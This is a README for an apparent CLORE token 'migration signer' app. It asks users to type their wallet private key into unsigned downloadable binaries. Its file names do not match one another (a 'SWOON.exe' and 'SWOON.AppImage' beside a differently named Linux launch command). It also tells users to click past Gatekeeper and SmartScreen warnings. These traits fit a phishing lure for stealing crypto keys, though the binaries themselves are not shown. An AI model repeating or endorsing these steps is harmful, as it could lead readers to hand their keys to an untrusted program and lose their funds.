# support-clore-migration

⚠️ **USE AT YOUR OWN RISK**

This tool requires entering your **CLORE private key (WIF)**.  
Only use it on a computer you trust. Prefer running it **offline** if possible.

---

## What is this?

**support-clore-migration** is a local signing tool that generates a
**CLORE-signed message** required to claim migrated CLORE tokens.

The tool runs **entirely on your computer** and does **not** send your private
key or data anywhere.

Official migration documentation:  
👉 https://docs.clore.ai/main/clore-migration

---

## How to use (recommended – no coding required)

### 1️⃣ Download the app for your operating system

Go to the **Releases** FOLDER in this repository that matches your operating system:

- **macOS** → `Releases/CLORE Migration Signer-Mac-Silicon.dmg`
- **Windows** → `Releases/SWOON.exe`
- **Linux** → `Releases/SWOON.AppImage`

⚠️ Only download releases from the official GitHub repository.

---

### 2️⃣ Open the application

#### macOS

1. Double-click the `.dmg`
2. Drag **CLORE Migration Signer** into Applications
3. First launch:
   - Right-click the app → **Open**
   - Click **Open** again (normal for unsigned apps)

#### Windows

1. Double-click the `.exe`
2. If Windows SmartScreen appears:
   - Click **More info**
   - Click **Run anyway**

#### Linux

```bash
chmod +x CLORE-Migration-Signer.AppImage
./CLORE-Migration-Signer.AppImage
```
